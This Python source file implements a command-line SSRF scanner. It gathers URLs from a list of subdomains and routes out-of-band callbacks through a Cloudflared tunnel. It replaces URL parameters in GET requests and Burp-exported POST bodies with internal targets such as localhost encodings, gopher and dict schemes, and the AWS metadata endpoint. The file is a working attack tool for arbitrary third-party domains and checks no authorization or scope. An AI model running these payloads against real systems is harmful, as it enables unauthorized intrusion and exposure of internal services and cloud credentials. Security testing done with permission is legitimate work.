import asyncio
import click
import os
import subprocess
import time
import threading
import json
import psutil
import xml.etree.ElementTree as ET
from colorama import init, Fore, Style
from src.url_processor import URLProcessor
from src.ssrf_tester import SSRFTester
from src.callback_server import CallbackServer
from src.database import Database
from config import Config

# Initialize colorama
init()

def print_banner():
    banner = f"""
{Fore.CYAN}
 ███████╗███████╗██████╗ ███████╗    ██████╗ ███████╗████████╗███████╗ ██████╗████████╗ ██████╗ ██████╗ 
 ██╔════╝██╔════╝██╔══██╗██╔════╝    ██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗
 ███████╗███████╗██████╔╝█████╗      ██║  ██║█████╗     ██║   █████╗  ██║        ██║   ██║   ██║██████╔╝
 ╚════██║╚════██║██╔══██╗██╔══╝      ██║  ██║██╔══╝     ██║   ██╔══╝  ██║        ██║   ██║   ██║██╔══██╗
 ███████║███████║██║  ██║██║         ██████╔╝███████╗   ██║   ███████╗╚██████╗   ██║   ╚██████╔╝██║  ██║
 ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝         ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
{Style.RESET_ALL}
{Fore.YELLOW}                        Advanced SSRF Detection Tool v1.0 - Local + Public IP{Style.RESET_ALL}
"""
    print(banner)

def check_tools():
    """Check if required tools are installed"""
    config = Config()
    tools = {
        "gauplus": config.GAUPLUS_PATH,
        "qsreplace": config.QSREPLACE_PATH,
        "httpx": config.HTTPX_PATH
    }
    missing_tools = []
    for name, path in tools.items():
        try:
            subprocess.run([path, "--help"], capture_output=True, timeout=5)
            print(f"✅ {name}: Found")
        except (FileNotFoundError, subprocess.TimeoutExpired):
            missing_tools.append(name)
            print(f"❌ {name}: Not found")
    if missing_tools:
        print(f"\n{Fore.RED}Missing tools: {', '.join(missing_tools)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Install them with:{Style.RESET_ALL}")
        install_commands = {
            "gauplus": "go install github.com/bp0lr/gauplus@latest",
            "qsreplace": "go install github.com/tomnomnom/qsreplace@latest",
            "httpx": "go install github.com/projectdiscovery/httpx/cmd/httpx@latest"
        }
        for tool in missing_tools:
            print(f"  {install_commands.get(tool, f'Install {tool}')}")
        return False
    return True

def get_cloudflared_public_url():
    """Get the public Cloudflared tunnel URL from the process output"""
    import re
    try:
        with open("cloudflared.log", "r") as f:
            for line in f:
                match = re.search(r"https://[\w-]+\.trycloudflare.com", line)
                if match:
                    return match.group(0)
    except Exception:
        pass
    return None

def start_cloudflared_tunnel(port):
    """Start Cloudflared tunnel for the callback server"""
    import subprocess
    print(f"{Fore.YELLOW}🌐 Starting Cloudflared tunnel for port {port}...{Style.RESET_ALL}")
    with open("cloudflared.log", "w") as log_file:
        process = subprocess.Popen([
            "cloudflared", "tunnel", "--url", f"http://localhost:{port}"
        ], stdout=log_file, stderr=subprocess.STDOUT)
    # Wait for tunnel to be established
    import time
    for _ in range(10):
        time.sleep(2)
        url = get_cloudflared_public_url()
        if url:
            print(f"{Fore.GREEN}✅ Cloudflared tunnel established!{Style.RESET_ALL}")
            print(f"{Fore.CYAN}🌐 Public URL: {url}{Style.RESET_ALL}")
            return url
    print(f"{Fore.RED}❌ Failed to get Cloudflared public URL{Style.RESET_ALL}")
    return None

@click.group()
def cli():
    """SSRF Detection Tool - Local Server + Public IP Method"""
    print_banner()

@cli.command()
@click.option('--host', default='127.0.0.1', help='Host to bind the callback server (use 127.0.0.1 for Cloudflared)')
@click.option('--port', default=9001, help='Port to bind the callback server')
@click.option('--cloudflared', is_flag=True, help='Expose server via Cloudflared tunnel')
def server(host, port, cloudflared):
    """Start the callback server with optional Cloudflared tunnel"""
    public_url = None
    if cloudflared:
        public_url = start_cloudflared_tunnel(port)
    server_instance = CallbackServer()
    print(f"\n{Fore.GREEN}🚀 Starting SSRF callback server...{Style.RESET_ALL}")
    print(f"📍 Local server: http://{host}:{port}")
    if public_url:
        print(f"🌐 Public Cloudflared URL: {public_url}")
        print(f"🔗 Callback endpoint: {public_url}/callback")
    print(f"💡 If using Cloudflared, use the above public URL as your callback endpoint.")
    server_instance.run(host=host, port=port)

@cli.command()
@click.option('--get', type=click.Path(exists=True), help='Path to subdomains file for GET/waybackurls scan')
@click.option('--post', type=click.Path(exists=True), help='Path to Burp Suite XML file for POST scan')
@click.option('--output', '-o', help='Output file for results')
@click.option('--callback-url', '-c', help='Custom callback URL (default: auto-detect from Cloudflared tunnel)')
@click.option('--tools', '-t', help='Comma-separated list of tools to use for URL extraction (gauplus,gau,waybackurls,katana)', default=None)
def scan(get, post, output, callback_url, tools):
    """Scan for SSRF vulnerabilities using GET or POST requests"""
    # Enforce mutual exclusion and requirement
    if (get and post) or (not get and not post):
        print(f"{Fore.RED}❌ You must specify exactly one of --get or --post.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Use --get for GET/waybackurls scan, or --post for POST/Burp scan.{Style.RESET_ALL}")
        return
    # Check if callback server is running
    config = Config()
    server_url = f"http://127.0.0.1:{config.CALLBACK_SERVER_PORT}/health"
    try:
        import requests
        resp = requests.get(server_url, timeout=5)
        if resp.status_code != 200:
            raise Exception
    except Exception:
        print(f"{Fore.RED}❌ Callback server is not running!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 Start it with: python main.py server --cloudflared{Style.RESET_ALL}")
        return
    tool_list = [t.strip() for t in tools.split(',')] if tools else None
    if post:
        # Validate Burp Suite XML by content
        try:
            import xml.etree.ElementTree as ET
            tree = ET.parse(post)
            root = tree.getroot()
            if root.tag.lower() != 'items' or not root.findall('item'):
                raise ValueError
        except Exception:
            print(f"{Fore.RED}❌ The --post file does not appear to be a valid Burp Suite XML file.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}💡 It should have <items> as the root and contain <item> elements.{Style.RESET_ALL}")
            return
        if not callback_url:
            callback_url = get_cloudflared_public_url()
            if callback_url:
                callback_url = f"{callback_url}/callback"
                print(f"{Fore.GREEN}🌐 Using Cloudflared callback URL: {callback_url}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}❌ No callback URL specified and no Cloudflared tunnel found{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}💡 Either start the server with: python main.py server --cloudflared{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}💡 Or provide custom callback URL with: -c https://<your-tunnel>.trycloudflare.com/callback{Style.RESET_ALL}")
                return
        # Patch: robust body param extraction for POST scan
        import re, urllib.parse, json as js
        from email.parser import BytesParser
        from email.policy import default as email_default
        def extract_url_params_from_body(body, headers):
            url_params = []
            content_type = headers.get('Content-Type', headers.get('content-type', '')).lower()
            # Try JSON
            try:
                data = js.loads(body)
                def walk_json(obj, parent=None):
                    if isinstance(obj, dict):
                        for k, v in obj.items():
                            walk_json(v, k)
                    elif isinstance(obj, list):
                        for v in obj:
                            walk_json(v, parent)
                    elif isinstance(obj, str):
                        if re.search(r'(https?|gopher|ftp|file|dict|php|jar|tftp)://', obj):
                            url_params.append((parent or '', obj))
                        # Try urldecode and check again
                        try:
                            decoded = urllib.parse.unquote(obj)
                            if decoded != obj and re.search(r'(https?|gopher|ftp|file|dict|php|jar|tftp)://', decoded):
                                url_params.append((parent or '', decoded))
                        except Exception:
                            pass
                walk_json(data)
                return url_params
            except Exception:
                pass
            # Try multipart
            if 'multipart/form-data' in content_type:
                try:
                    boundary = re.search(r'boundary=([^;]+)', content_type)
                    if boundary:
                        boundary = boundary.group(1)
                        parser = BytesParser(policy=email_default)
                        msg = parser.parsebytes((f'Content-Type: {content_type}\r\n\r\n' + body).encode())
                        for part in msg.iter_parts():
                            payload = part.get_payload(decode=True)
                            name = part.get_param('name', header='content-disposition') or ''
                            if payload:
                                val = payload.decode(errors='ignore')
                                if re.search(r'(https?|gopher|ftp|file|dict|php|jar|tftp)://', val):
                                    url_params.append((name, val))
                                try:
                                    decoded = urllib.parse.unquote(val)
                                    if decoded != val and re.search(r'(https?|gopher|ftp|file|dict|php|jar|tftp)://', decoded):
                                        url_params.append((name, decoded))
                                except Exception:
                                    pass
                except Exception:
                    pass
            # Try urlencoded
            try:
                qs = urllib.parse.parse_qs(body)
                for k, vs in qs.items():
                    for v in vs:
                        if re.search(r'(https?|gopher|ftp|file|dict|php|jar|tftp)://', v):
                            url_params.append((k, v))
                        try:
                            decoded = urllib.parse.unquote(v)
                            if decoded != v and re.search(r'(https?|gopher|ftp|file|dict|php|jar|tftp)://', decoded):
                                url_params.append((k, decoded))
                        except Exception:
                            pass
            except Exception:
                pass
            # Fallback: scan for URLs in raw body
            for match in re.findall(r'(https?|gopher|ftp|file|dict|php|jar|tftp)://[^\s\"\']+', body):
                url_params.append(('raw', match))
            return url_params
        # Patch run_post_scan to use robust extraction
        import types
        async def patched_run_post_scan(burp_file, output_file, callback_url):
            print(f"\n{Fore.GREEN}🚀 Starting POST SSRF scan (Burp Suite XML)...{Style.RESET_ALL}")
            print(f"📁 Burp Suite file: {burp_file}")
            print(f"🔗 Callback URL: {callback_url}")
            import xml.etree.ElementTree as ET
            import base64
            tree = ET.parse(burp_file)
            root = tree.getroot()
            post_requests = []
            for item in root.findall('item'):
                # Try to get method from <method>, else infer from <request>
                method = item.findtext('method')
                request_raw = item.findtext('request')
                # Handle base64-encoded requests
                req_elem = item.find('request')
                if req_elem is not None and req_elem.attrib.get('base64', 'false') == 'true' and request_raw:
                    try:
                        request_raw = base64.b64decode(request_raw).decode(errors='replace')
                    except Exception:
                        pass
                url = item.findtext('url')
                if not url:
                    url_elem = item.find('url')
                    if url_elem is not None and url_elem.text:
                        url = url_elem.text
                # If method is missing, try to infer from request_raw
                if (not method or not method.strip()) and request_raw:
                    first_line = request_raw.split('\n', 1)[0].strip()
                    if first_line:
                        method = first_line.split(' ', 1)[0].upper()
                if method and method.strip().upper() == 'POST' and request_raw:
                    req_lines = request_raw.split('\n')
                    headers = {}
                    body = ''
                    in_body = False
                    for line in req_lines[1:]:
                        if line.strip() == '':
                            in_body = True
                            continue
                        if in_body:
                            body += line + '\n'
                        else:
                            if ':' in line:
                                k, v = line.split(':', 1)
                                headers[k.strip()] = v.strip()
                    body = body.strip()
                    post_requests.append({'url': url, 'headers': headers, 'body': body, 'raw': request_raw})
            if not post_requests:
                print(f"{Fore.RED}❌ No POST requests found in Burp file.{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}💡 If this is a Burp search export, ensure the <request> and <method> fields are present. If not, try exporting with a different Burp function.{Style.RESET_ALL}")
                return
            print(f"{Fore.YELLOW}Found {len(post_requests)} POST requests in Burp file.{Style.RESET_ALL}")
            for req in post_requests:
                req['url_params'] = extract_url_params_from_body(req['body'], req['headers'])
            ssrf_targets = [
                "http://localhost", "http://127.0.0.1", "http://169.254.169.254", "http://0.0.0.0", "http://[::1]",
                "http://0177.1/", "http://0x7f.1/", "http://127.000.000.1", "https://520968996",
                "gopher://127.0.0.1", "dict://127.0.0.1", "php://filter", "jar://127.0.0.1", "tftp://127.0.0.1",
                "http://[::1]", "http://[::]",
                "http://10.0.0.1.xip.io", "http://www.10.0.0.1.xip.io", "http://mysite.10.0.0.1.xip.io", "http://foo.bar.10.0.0.1.xip.io",
                "http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/meta-data/local-hostname", "http://169.254.169.254/latest/meta-data/public-hostname"
            ]
            async with SSRFTester() as tester:
                results = await tester.test_post_requests(post_requests, callback_url, ssrf_targets)
            if output_file:
                with open(output_file, 'w') as f:
                    json.dump(results, f, indent=2)
                print(f"💾 POST SSRF results saved to: {output_file}")
            print(f"\n{Fore.GREEN}✅ POST SSRF scan completed!{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}Blind SSRF results: {len(results['blind'])} | Internal SSRF results: {len(results['internal'])}{Style.RESET_ALL}")
            return
        globals()['run_post_scan'] = patched_run_post_scan
        asyncio.run(run_post_scan(post, output, callback_url))
        return
    if get:
        # Validate plain text file (not XML)
        try:
            with open(get, 'r') as f:
                first_line = f.readline()
                if first_line.strip().startswith('<'):
                    print(f"{Fore.RED}❌ The --get file does not appear to be a plain text subdomains file.{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}💡 It should be a list of subdomains, one per line.{Style.RESET_ALL}")
                    return
        except Exception:
            print(f"{Fore.RED}❌ Could not read the --get file. Please check the file path and permissions.{Style.RESET_ALL}")
            return
        if not callback_url:
            callback_url = get_cloudflared_public_url()
            if callback_url:
                callback_url = f"{callback_url}/callback"
                print(f"{Fore.GREEN}🌐 Using Cloudflared callback URL: {callback_url}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}❌ No callback URL specified and no Cloudflared tunnel found{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}💡 Either start the server with: python main.py server --cloudflared{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}💡 Or provide custom callback URL with: -c https://<your-tunnel>.trycloudflare.com/callback{Style.RESET_ALL}")
                return
        asyncio.run(run_scan(get, output, callback_url, tool_list))
        return

@cli.command()
def status():
    """Show server status"""
    db = Database()
    config = Config()
    print(f"{Fore.GREEN}=== SSRF Detection Server Status ==={Style.RESET_ALL}")
    # Check if callback server is running
    try:
        import requests
        response = requests.get(f"http://127.0.0.1:{config.CALLBACK_SERVER_PORT}/health", timeout=5)
        if response.status_code == 200:
            print(f"📊 Callback Server: {Fore.GREEN}✅ Running{Style.RESET_ALL} on http://127.0.0.1:{config.CALLBACK_SERVER_PORT}")
        else:
            print(f"📊 Callback Server: {Fore.YELLOW}⚠️  Unexpected response{Style.RESET_ALL}")
    except Exception:
        print(f"📊 Callback Server: {Fore.RED}❌ Not running{Style.RESET_ALL}")
    # Show vulnerability stats
    stats = db.get_stats()
    print(f"\n{Fore.CYAN}=== Vulnerability Statistics ==={Style.RESET_ALL}")
    print(f"Total Vulnerabilities: {stats['total_vulnerabilities']}")
    print(f"Unique Domains: {stats['unique_domains']}")
    print(f"Latest Discovery: {stats['latest_discovery'] or 'None'}")

@cli.command()
def setup():
    """Setup and check tool dependencies"""
    print(f"{Fore.YELLOW}🔧 Checking tool dependencies...{Style.RESET_ALL}")
    if check_tools():
        print(f"\n{Fore.GREEN}✅ All tools are installed and ready!{Style.RESET_ALL}")
        print(f"\n{Fore.CYAN}Next steps:{Style.RESET_ALL}")
        print(f"1. Start the server: {Fore.YELLOW}python main.py server --host 0.0.0.0 --port 9001{Style.RESET_ALL}")
        print(f"2. Run a scan: {Fore.YELLOW}python main.py scan -s subdomains.txt -c http://<your-public-ip>:9001/callback{Style.RESET_ALL}")
    else:
        print(f"\n{Fore.RED}❌ Please install missing tools before proceeding{Style.RESET_ALL}")

@cli.command()
def stats():
    """Show vulnerability statistics"""
    db = Database()
    stats = db.get_stats()
    
    print(f"{Fore.GREEN}=== SSRF Detection Statistics ==={Style.RESET_ALL}")
    print(f"Total Vulnerabilities: {Fore.CYAN}{stats['total_vulnerabilities']}{Style.RESET_ALL}")
    print(f"Unique Domains: {Fore.CYAN}{stats['unique_domains']}{Style.RESET_ALL}")
    print(f"Latest Discovery: {Fore.CYAN}{stats['latest_discovery'] or 'None'}{Style.RESET_ALL}")
    
    if stats['endpoints_by_domain']:
        print(f"\n{Fore.YELLOW}📊 Vulnerabilities by Domain:{Style.RESET_ALL}")
        sorted_domains = sorted(stats['endpoints_by_domain'].items(), key=lambda x: x[1], reverse=True)
        for domain, count in sorted_domains:
            print(f"  {Fore.CYAN}{domain}{Style.RESET_ALL}: {count}")

@cli.command()
def list_vulns():
    """List all discovered vulnerabilities"""
    db = Database()
    vulns = db.load_vulnerable_endpoints()
    
    if not vulns:
        print(f"{Fore.YELLOW}No vulnerabilities found yet.{Style.RESET_ALL}")
        return
    
    print(f"{Fore.GREEN}=== Discovered SSRF Vulnerabilities ==={Style.RESET_ALL}")
    
    for vuln in vulns:
        print(f"\n{Fore.CYAN}🎯 Vulnerability #{vuln.get('id')}{Style.RESET_ALL}")
        print(f"  Domain: {vuln.get('domain')}")
        print(f"  Vulnerable URL: {vuln.get('vulnerable_url')}")
        print(f"  Callback IP: {vuln.get('callback_ip')}")
        print(f"  Method: {vuln.get('method', 'GET')}")
        print(f"  User Agent: {vuln.get('user_agent', 'Unknown')[:80]}...")
        print(f"  Discovered: {vuln.get('discovered_at')}")
        print(f"  {'-' * 50}")

@cli.command()
def clear_data():
    """Clear all stored vulnerability data"""
    if click.confirm(f"{Fore.RED}⚠️  This will delete all stored vulnerability data. Continue?{Style.RESET_ALL}"):
        config = Config()
        
        # Remove vulnerability data
        if os.path.exists(config.VULNERABLE_ENDPOINTS_FILE):
            os.remove(config.VULNERABLE_ENDPOINTS_FILE)
            print(f"{Fore.GREEN}✅ Cleared vulnerability database{Style.RESET_ALL}")
        
        # Remove ngrok info
        if os.path.exists(config.NGROK_CONFIG_FILE):
            os.remove(config.NGROK_CONFIG_FILE)
            print(f"{Fore.GREEN}✅ Cleared ngrok configuration{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}🧹 Data cleanup completed{Style.RESET_ALL}")

async def run_scan(subdomains_file: str, output_file: str = None, callback_url: str = None, tools=None):
    """Main scanning logic: blind SSRF + internal SSRF"""
    if not os.path.exists(subdomains_file):
        print(f"{Fore.RED}❌ Error: Subdomains file not found: {subdomains_file}{Style.RESET_ALL}")
        return
    config = Config()
    db = Database()
    processor = URLProcessor()
    # Require callback URL for blind SSRF
    if not callback_url:
        print(f"{Fore.RED}❌ No callback URL specified. Please provide your public callback URL with -c http://<your-public-ip>:<port>/callback{Style.RESET_ALL}")
        return
    print(f"\n{Fore.GREEN}🚀 Starting SSRF scan...{Style.RESET_ALL}")
    print(f"📁 Subdomains file: {subdomains_file}")
    print(f"🔗 Callback URL: {callback_url}")
    # Step 1: Extract URLs from subdomains
    print(f"\n{Fore.YELLOW}[1/5] 🔍 Extracting URLs from subdomains...{Style.RESET_ALL}")
    all_urls = processor.extract_urls_from_subdomains(subdomains_file, tools=tools)
    if not all_urls:
        print(f"{Fore.RED}❌ No URLs found. Check your subdomains file and extraction tools.{Style.RESET_ALL}")
        return
    # Step 2: Filter URLs with parameters (URL params)
    print(f"\n{Fore.YELLOW}[2/5] 🔍 Filtering URLs with URL parameters...{Style.RESET_ALL}")
    param_urls = processor.filter_urls_with_params(all_urls)
    if not param_urls:
        print(f"{Fore.RED}❌ No URLs with URL parameters found.{Style.RESET_ALL}")
        return
    # Step 3: Blind SSRF - Replace params with callback URL
    print(f"\n{Fore.YELLOW}[3/5] 🔄 Blind SSRF: Replacing parameters with callback URL...{Style.RESET_ALL}")
    modified_urls = processor.replace_params_with_callback(param_urls, callback_url)
    if not modified_urls:
        print(f"{Fore.RED}❌ Failed to modify URLs. Check qsreplace installation.{Style.RESET_ALL}")
        return
    # Step 4: Blind SSRF - Test URLs
    print(f"\n{Fore.YELLOW}[4/5] 🚀 Testing URLs for Blind SSRF...{Style.RESET_ALL}")
    async with SSRFTester() as tester:
        results = await tester.test_urls(modified_urls)
    # Save results if output file specified
    if output_file:
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"💾 Results saved to: {output_file}")
    # Show summary
    print(f"\n{Fore.GREEN}✅ Blind SSRF scan completed!{Style.RESET_ALL}")
    print(f"\n{Fore.YELLOW}📊 Summary:{Style.RESET_ALL}")
    print(f"  📄 Total URLs found: {len(all_urls)}")
    print(f"  🔗 URLs with URL parameters: {len(param_urls)}")
    print(f"  🧪 URLs tested (blind SSRF): {len(modified_urls)}")

    print(f"\n{Fore.CYAN}🎯 Monitor your callback server for SSRF hits!{Style.RESET_ALL}")
    print(f"📊 Dashboard: http://127.0.0.1:9001")
    # Step 5: Internal SSRF - Test with internal targets
    print(f"\n{Fore.YELLOW}[5/5] 🕵️ Testing URLs for Internal SSRF (localhost, metadata, exotic handlers, etc)...{Style.RESET_ALL}")
    ssrf_targets = [
        # IPv4
        "http://localhost", "http://127.0.0.1", "http://169.254.169.254", "http://0.0.0.0", "http://[::1]",
        "http://0177.1/", "http://0x7f.1/", "http://127.000.000.1", "https://520968996",
        # Exotic Handlers
        "gopher://127.0.0.1", "dict://127.0.0.1", "php://filter", "jar://127.0.0.1", "tftp://127.0.0.1",
        # IPv6
        "http://[::1]", "http://[::]",
        # Wildcard DNS
        "http://10.0.0.1.xip.io", "http://www.10.0.0.1.xip.io", "http://mysite.10.0.0.1.xip.io", "http://foo.bar.10.0.0.1.xip.io",
        # AWS Metadata
        "http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/meta-data/local-hostname", "http://169.254.169.254/latest/meta-data/public-hostname"
    ]
    internal_results = []
    import aiohttp
    from difflib import SequenceMatcher
    from urllib.parse import urlparse
    from tqdm import tqdm
    import asyncio
    # Helper async function for a single internal SSRF test
    async def test_internal_ssrf(url, params, baseline_status, baseline_body, ssrf_targets):
        results = []
        from urllib.parse import unquote, urlparse
        for target in ssrf_targets:
            new_params = []
            for param in params:
                key_value = param.split('=', 1)
                if len(key_value) == 2:
                    value = key_value[1]
                    decoded_value = unquote(value)
                    if decoded_value.startswith(('http://', 'https://', 'gopher://', 'dict://', 'php://', 'jar://', 'tftp://')):
                        new_params.append(f"{key_value[0]}={target}")
                    else:
                        new_params.append(param)
                else:
                    new_params.append(param)
            parsed = urlparse(url)
            new_query = '&'.join(new_params)
            new_url = url.replace(parsed.query, new_query)
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(new_url, timeout=10, allow_redirects=False) as resp:
                        status = resp.status
                        headers = dict(resp.headers)
                        body = await resp.text()
                        waf_headers = [h for h in headers if 'waf' in h.lower() or 'firewall' in h.lower()]
                        similarity = SequenceMatcher(None, baseline_body, body).ratio()
                        is_interesting = False
                        if status != baseline_status:
                            is_interesting = True
                        if similarity < 0.95:
                            is_interesting = True
                        if any(keyword in body.lower() for keyword in ["localhost", "127.0.0.1", "meta-data", "x-amz", "ec2", "internal", "root:x", "password", "admin"]):
                            is_interesting = True

                        waf_headers=False # debug should be cahnged later

                        if status == 200 and not waf_headers and is_interesting:
                            print(f"{Fore.RED}❗ Possible Internal SSRF Vulnerability: {new_url}{Style.RESET_ALL}")
                            print(f"    Status: {status} | Similarity: {similarity:.2f} | WAF: {waf_headers}")
                        results.append({
                            "url": new_url,
                            "status": status,
                            "baseline_status": baseline_status,
                            "waf_headers": waf_headers,
                            "body_snippet": body[:200],
                            "similarity": similarity,
                            "is_interesting": is_interesting
                        })
            except Exception:
                pass
        return results
    # Prepare tasks for all param_urls
    tasks = []
    for url in tqdm(param_urls, desc="Testing URLs (Internal SSRF)"):
        parsed = urlparse(url)
        params = parsed.query.split('&')
        # Make baseline request (no injection)
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=10) as resp:
                    baseline_status = resp.status
                    baseline_headers = dict(resp.headers)
                    baseline_body = await resp.text()
        except Exception:
            baseline_status = None
            baseline_headers = {}
            baseline_body = ""
        tasks.append(test_internal_ssrf(url, params, baseline_status, baseline_body, ssrf_targets))
    # Run all tasks concurrently
    all_results = await asyncio.gather(*tasks)
    for result in all_results:
        internal_results.extend(result)
    print(f"\n{Fore.GREEN}✅ Internal SSRF scan completed!{Style.RESET_ALL}")
    print(f"Total internal SSRF tests performed: {len(internal_results)}")
    # Optionally save internal SSRF results
    if output_file:
        with open(output_file.replace('.json', '_internal.json'), 'w') as f:
            json.dump(internal_results, f, indent=2)
        print(f"💾 Internal SSRF results saved to: {output_file.replace('.json', '_internal.json')}")
        
async def run_post_scan(burp_file, output_file, callback_url):
    """Scan POST requests from Burp Suite XML for SSRF (blind + internal)"""
    print(f"\n{Fore.GREEN}🚀 Starting POST SSRF scan (Burp Suite XML)...{Style.RESET_ALL}")
    print(f"📁 Burp Suite file: {burp_file}")
    print(f"🔗 Callback URL: {callback_url}")
    import re
    import aiohttp
    from urllib.parse import urlparse, parse_qs, urlencode
    from tqdm import tqdm
    from difflib import SequenceMatcher
    # Step 1: Parse Burp XML, extract POST requests
    tree = ET.parse(burp_file)
    root = tree.getroot()
    post_requests = []
    for item in root.findall('item'):
        method = item.findtext('method')
        request_raw = item.findtext('request')
        # Handle base64-encoded requests
        req_elem = item.find('request')
        if req_elem is not None and req_elem.attrib.get('base64', 'false') == 'true' and request_raw:
            try:
                request_raw = base64.b64decode(request_raw).decode(errors='replace')
            except Exception:
                pass
        url = item.findtext('url')
        if not url:
            url_elem = item.find('url')
            if url_elem is not None and url_elem.text:
                url = url_elem.text
        # If method is missing, try to infer from request_raw
        if (not method or not method.strip()) and request_raw:
            first_line = request_raw.split('\n', 1)[0].strip()
            if first_line:
                method = first_line.split(' ', 1)[0].upper()
        if method and method.strip().upper() == 'POST' and request_raw:
            req_lines = request_raw.split('\n')
            headers = {}
            body = ''
            in_body = False
            for line in req_lines[1:]:
                if line.strip() == '':
                    in_body = True
                    continue
                if in_body:
                    body += line + '\n'
                else:
                    if ':' in line:
                        k, v = line.split(':', 1)
                        headers[k.strip()] = v.strip()
            body = body.strip()
            post_requests.append({'url': url, 'headers': headers, 'body': body, 'raw': request_raw})
    if not post_requests:
        print(f"{Fore.RED}❌ No POST requests found in Burp file.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 If this is a Burp search export, ensure the <request> and <method> fields are present. If not, try exporting with a different Burp function.{Style.RESET_ALL}")
        return
    print(f"{Fore.YELLOW}Found {len(post_requests)} POST requests in Burp file.{Style.RESET_ALL}")
    # Step 2: For each POST, find URL-like params in body
    def find_url_like_params(body):
        # Try to parse as JSON, else as form-encoded
        url_params = []
        try:
            import json
            data = json.loads(body)
            for k, v in data.items():
                if isinstance(v, str) and re.search(r'(https?|gopher|ftp|file|dict|php|jar|tftp)://', v):
                    url_params.append((k, v))
        except Exception:
            # Fallback: form-encoded
            qs = parse_qs(body)
            for k, vs in qs.items():
                for v in vs:
                    if re.search(r'(https?|gopher|ftp|file|dict|php|jar|tftp)://', v):
                        url_params.append((k, v))
        return url_params
    # Prepare post_requests with url_params
    for req in post_requests:
        req['url_params'] = find_url_like_params(req['body'])
    # SSRF targets for internal scan
    ssrf_targets = [
        "http://localhost", "http://127.0.0.1", "http://169.254.169.254", "http://0.0.0.0", "http://[::1]",
        "http://0177.1/", "http://0x7f.1/", "http://127.000.000.1", "https://520968996",
        "gopher://127.0.0.1", "dict://127.0.0.1", "php://filter", "jar://127.0.0.1", "tftp://127.0.0.1",
        "http://[::1]", "http://[::]",
        "http://10.0.0.1.xip.io", "http://www.10.0.0.1.xip.io", "http://mysite.10.0.0.1.xip.io", "http://foo.bar.10.0.0.1.xip.io",
        "http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/meta-data/local-hostname", "http://169.254.169.254/latest/meta-data/public-hostname"
    ]
    # Run SSRFTester for POST requests
    async with SSRFTester() as tester:
        results = await tester.test_post_requests(post_requests, callback_url, ssrf_targets)
    # Save results if output file specified
    if output_file:
        with open(output_file, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"💾 POST SSRF results saved to: {output_file}")
    # Print summary
    print(f"\n{Fore.GREEN}✅ POST SSRF scan completed!{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Blind SSRF results: {len(results['blind'])} | Internal SSRF results: {len(results['internal'])}{Style.RESET_ALL}")
    return

if __name__ == "__main__":
    cli()
